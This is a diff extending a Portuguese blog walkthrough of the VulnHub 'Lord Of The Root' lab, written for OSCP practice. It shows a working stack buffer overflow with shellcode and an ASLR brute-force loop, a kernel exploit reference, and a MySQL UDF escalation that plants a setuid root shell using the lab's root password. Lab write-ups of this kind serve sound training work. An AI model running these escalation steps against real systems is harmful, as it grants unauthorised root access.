@@ -1,6 +1,6 @@
 ---
 title: "VulnHub - Lord Of The Root 1.0.1"
-tags: [Linux,Medium]
+tags: [Linux,Medium,UDF,BurpSuite,Gobuster,Port Knocking,Buffer Overflow Linux,Kernel,SQLInjection]
 categories: VulnHub OSCP
 ---
 
@@ -288,4 +288,162 @@ Agora está na porta 2, mas ai está, o **0x42424242** que é **BBBB**
 Ou seja... Controlamos o EIP!!
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf7.png)
+
+Nós verificamos que o ASLR está habilitado, e isso vai deixar nosso endereço de memória randômico, não podemos apenas jogar o shellcode em algum lugar e especificar o EIP para lá. Adicionalmente a isso, não temos instruções JMP ESP que o programa trabalhe.
+
+```bash
+cat /proc/sys/kernel/randomize_va_space 
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf8.png)
+
+A minha ideia aqui é que nós podemos "adivinhar" ou ter a sorte da execução do programa "deslizar" até nosso shellcode, por isso vou adicionar vários NOPs logo depois do EIP.
+
+Rodo meu payload novamente, usando um nopsled de 200
+
+E já verifico onde está o ESP no momento da execução
+
+Aqui vou fazer em um `file` copiado da pasta, que não está com suid habilitado, apenas pra demonstração.
+
+```bash
+run $(python -c 'print "A" * 171 + "B" * 4 + "\x90" * 2000')
+x/s $esp
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf9.png)
+
+Excelente, ainda controlamos o EIP e o ESP está apontando para outra localização, 0xbfffee50. Nós iremos usar esse endereço como localização para o EIP, adicionalmente vamos adicionar nosso shellcode.
+
+Um shellcode padrão que geralmente utilizo para essa atividade é esse:
+
+http://shell-storm.org/shellcode/files/shellcode-811.php
+
+http://shell-storm.org/shellcode/files/shellcode-827.php
+
+```
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
+```
+
+Payload:
+
+`run $(python -c 'print "A" * 171 + "\x50\xee\xff\xbf" + "\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')`
+
+Executamos na mesma instância e recebemos o shell de smeagol
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf10.png)
+
+Agora executamos em uma instância que está com o suid habilitado, seguindo a mesma ideia de descobrir o ESP e trocar a execução ali
+
+Por que o loop? Pois temos o ASLR habilitado, e ele vai ficar randomizando a memória toda vez que tiver a execução, uma hora ele vai bater no endereço que colocamos (pois o espaço é limitado) e com isso vamos ter a execução do nosso shellcode
+
+```
+for a in {1..1000}; do ./file $(python -c 'print "A" * 171 + "\x50\xee\xff\xbf" + "\x90" * 2000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'); done
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf11.png)
+
+Após executar e esperar, viramos root!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/buf12.png)
+
+## Kernel
+
+Verificando a versão do kernel dele, temos um exploit que da pra escalar vulnerabilidade nessa máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/lin3.png)
+
+https://www.exploit-db.com/exploits/39166/
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ker.png)
+
+Compilamos e executamos! Somos Root!
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ker1.png)
+
+## MYSQL
+
+Também podemos escalar privilégio através do MYSQL que está sendo executado como root
+
+```bash
+ps -ef | grep mysql
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms.png)
+
+Encontramos as credenciais de root do mysql
+
+`$db = new mysqli('localhost', 'root', 'darkshadow', 'Webapp');`
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms0.png)
+
+Mysql normalmente não é executado com permissões de root, isso nos abre a possibilidade de diversos pontos para escalação de privilégio nessa máquina, também se verificarmos a versão dele, é uma versão antiga
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms1.png)
+
+Criamos nosso `/tmp/setuid.c`
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0); setgid(0); system("/bin/bash");
+}
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/mm.png)
+
+Encontramos um exploit pra ele
+
+https://www.exploit-db.com/exploits/1518
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms2.png)
+
+Copiamos para a máquina e compilamos ele
+
+```
+gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms3.png)
+
+Logamos no mysql como root e exploramos a vulnerabilidade
+
+```
+mysql -u root -pdarkshadow
+use mysql;
+create table root(line blob);
+insert into root values(load_file('/home/smeagol/raptor_udf2.so'));
+select * from root into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+select * from mysql.func;
+select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
+select do_system('gcc -o /tmp/setuid /tmp/setuid.c');
+select do_system('chmod u+s /tmp/setuid');
+\!sh /tmp/setuid
+id
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms4.png)
+
+Agora ganhamos o shell de root
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/ms5.png)
+
+# Bônus
+
+Verificando o cron dele, vemos que ele troca o arquivo entre as pastas a cada 3 minutos
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/cron.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/cron1.png)
+
+Aqui vemos o código fonte do arquivo `file` que está vulnerável a buffer overflow
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/cron2.png)
+
+
+
 
